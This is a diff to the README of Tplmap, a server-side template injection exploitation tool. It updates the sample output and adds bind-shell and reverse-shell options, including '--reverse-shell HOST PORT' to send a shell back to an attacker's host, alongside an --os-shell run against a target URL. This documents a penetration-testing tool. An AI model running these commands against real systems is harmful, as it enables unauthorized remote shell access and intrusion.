@@ -18,7 +18,7 @@ Example
 
 ```
 $ ./tplmap.py -u 'http://www.target.com/app?id=*' 
-[+] Tplmap 0.1c
+[+] Tplmap 0.1d
     Automatic Server-Side Template Injection Detection and Exploitation Tool
 
 [+] Found placeholder in GET parameter 'inj'
@@ -38,15 +38,20 @@ $ ./tplmap.py -u 'http://www.target.com/app?id=*'
   OS: darwin
   Technique: render
   Capabilities:
-    Code evaluation: yes, javascript code
-    OS command execution: yes
-    File write: yes
-    File read: yes
+  
+   Code evaluation: yes, javascript code
+   Shell command execution: yes
+   File write: yes
+   File read: yes
+   Bind and reverse shell: yes
 
 [+] Rerun tplmap providing one of the following options:
-    --os-cmd or --os-shell to access the underlying operating system
-    --upload LOCAL REMOTE to upload files to the server
-    --download REMOTE LOCAL to download remote files
+
+   --os-shell or --os-cmd to execute shell commands via the injection
+   --upload LOCAL REMOTE to upload files to the server
+   --download REMOTE LOCAL to download remote files
+   --bind-shell PORT to bind a shell on a port and connect to it
+   --reverse-shell HOST PORT to run a shell back to the attacker's HOST PORT
         
 $ ./tplmap.py -u 'http://www.target.com/app?id=*' --os-shell
 [+] Run commands on the operating system.
